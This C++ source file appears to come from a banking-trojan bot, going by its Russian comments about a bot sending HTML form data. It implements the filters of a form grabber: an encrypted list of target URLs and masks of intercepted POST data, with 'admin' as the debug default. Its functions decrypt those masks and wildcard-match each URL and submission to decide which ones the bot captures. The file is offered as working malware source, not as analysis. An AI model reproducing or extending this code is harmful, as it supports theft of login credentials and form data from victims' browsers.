//---------------------------------------------------------------------------


#pragma hdrstop

#include "Modules.h"
#ifdef FgrFiltersH


//---------------------------------------------------------------------------
#include "Memory.h"
#include "Strings.h"
#include "Crypt.h"

//---------------------------------------------------------------------------

//****************************************************
//  Массив URL адресов с которых бот будет отправлять
//  данные HTML форм.
//****************************************************
char FGR_URL_FILTERS[FGRFILTER_PARAM_SIZE_URLS] = FGRFILTER_PARAM_NAME_URLS;
#define FGR_URL_FILTERS_HASH 0xBB05876C /* FGR_URL_FILTERS */


//****************************************************
//  Массив масок перехватываемых пост данных
//****************************************************
#ifndef DEBUGCONFIG
	char FGR_PARAMS_FILTERS[FGRFILTER_PARAM_SIZE_DATAMASK] = FGRFILTER_PARAM_NAME_DATAMASK;
#else
	char FGR_PARAMS_FILTERS[FGRFILTER_PARAM_SIZE_DATAMASK] = "admin\0\0";
#endif

#define FGR_PARAMS_FILTERS_HASH 0xBE738607 /* FGR_PARAMS_FILTERS */


// Максимальный размер фильтра в массиве
DWORD FGR_FILTERS_MAX_FILTER_LEN = 0;


//---------------------------------------------------------------------
bool FGRFiltersArrayEmpty()
{
	// Функция возвращает истину если массив фильтров не
	// содержит данных
	return CalcHash(FGR_URL_FILTERS) == FGR_URL_FILTERS_HASH;
}
//---------------------------------------------------------------------

DWORD GetFGRFilterMaxLen()
{
	// Функция возвращает максимальный размер фильтра в массиве

	if (FGR_FILTERS_MAX_FILTER_LEN == 0)
	{
		PCHAR Tmp = FGR_URL_FILTERS;
        DWORD Max = 0;
		// Перебираем массив
		while (*Tmp != 0)
		{
			Max = StrCalcLength(Tmp);
			if (Max > FGR_FILTERS_MAX_FILTER_LEN)
				FGR_FILTERS_MAX_FILTER_LEN = Max;

			// Переходим к следующей строке
			Tmp = STR::End(Tmp);
			Tmp++;
        }
	}

	return FGR_FILTERS_MAX_FILTER_LEN;
}
//---------------------------------------------------------------------

bool FiltrateFormGrabberURL(PCHAR URL)
{
	//  Ыункция возвращает истину если ссылка
	//	поддерживается	формграбером

	if (STR::IsEmpty(URL))
		return false;

	if (FGRFiltersArrayEmpty())
		return true;


	DWORD MaskLen = GetFGRFilterMaxLen();

	PCHAR Mask = STR::Alloc(MaskLen);
	if (Mask == NULL) return true;

	bool Result = false;

	PCHAR Tmp = FGR_URL_FILTERS;

	// Перебираем массив
	while (*Tmp != 0)
	{
    	// декодируем текущую строку
		m_memset(Mask, 0, MaskLen);
		Decrypt(Tmp, Mask);

		if (WildCmp(URL, Mask))
		{
			Result = true;
            break;
        }

		// Переходим к следующей строке
		Tmp = STR::End(Tmp);
		Tmp++;
	}

	STR::Free(Mask);

    return Result;
}
//---------------------------------------------------------------------


//-------------------------------------------------
//  FiltrateFormGrabberData - функция возвращает
//  	истину если данные прошли фильтрацию
//-------------------------------------------------
bool FiltrateFormGrabberData(const char* Data)
{
	if (AnsiStr::IsEmpty(Data))
		return false;

	TStrEnum E(FGR_PARAMS_FILTERS, FGRFILTER_PARAM_ENCRYPTED_DATAMASK, FGR_PARAMS_FILTERS_HASH);

	if (E.IsEmpty())
		return true;

	while (E.Next())
	{
		if (WildCmp((char*)Data, E.Line().t_str()))
            return true;
	}
		
    return false;
}




//---------------------------------------------------------------------------
#endif
